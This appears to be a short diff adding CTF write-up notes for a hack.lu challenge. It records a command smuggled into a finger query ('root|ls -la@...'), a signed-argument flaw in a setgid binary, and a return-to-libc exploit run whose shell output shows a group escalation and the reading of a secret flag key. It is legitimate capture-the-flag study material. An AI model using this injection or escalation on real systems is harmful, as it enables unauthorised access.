@@ -1,0 +1,43 @@
+1. редактируем /etc/services, меняя порт у сервиса finger с 79 на 2003
+2. finger "root|ls -la@ctf.hack.lu"
+3. -r-xr-sr-x  1 root  leaders  4796 Sep  8 22:57 auth
+4. auth accepts 2 cmdline arguments
+5. sArg1, iArg2, iArg2 >= strlen(sArg1) && iArg2 < 9
+6. iArg2 is SIGNED !!
+7. read http://emsi.it.pl/sploits/solaris/sparcoverflow.html
+8. return-to-libc exploit
+
+exploiting
+==============
+
+-bash-4.2$ ./minisploit /home/user/auth 8
+bufsz = 8, nshift = 0
+System  set to 2009e4c4
+/bin/sh set to 20152248
+trying to login
+sh: Cannot determine current working directory
+sh: Cannot determine current working directory
+$ whoami
+user
+$ id
+uid=1000(user) gid=100(users) egid=101(leaders) groups=100(users)
+$ cd /home
+$ ls -la
+total 16
+drwxr-xr-x   4 root  wheel    512 Sep  8 21:15 .
+drwxr-xr-x  21 root  wheel    512 Sep  7 18:50 ..
+drwxr-xr-x   2 root  leaders  512 Sep  8 21:16 klingone
+drwxr-xr-x   2 root  users    512 Sep 19 19:28 user
+$ cd kl 
+cd: can't cd to kl
+$ cd klingone
+$ ls -la
+total 12
+drwxr-xr-x  2 root      leaders  512 Sep  8 21:16 .
+drwxr-xr-x  4 root      wheel    512 Sep  8 21:15 ..
+-r--r-----  1 klingone  leaders   60 Sep 19 04:13 secret
+$ cat secret
+LOGBOOK ANDROMEDA7
+------------------
+key: a3YCcRtDqLMp0OK2
+$ 
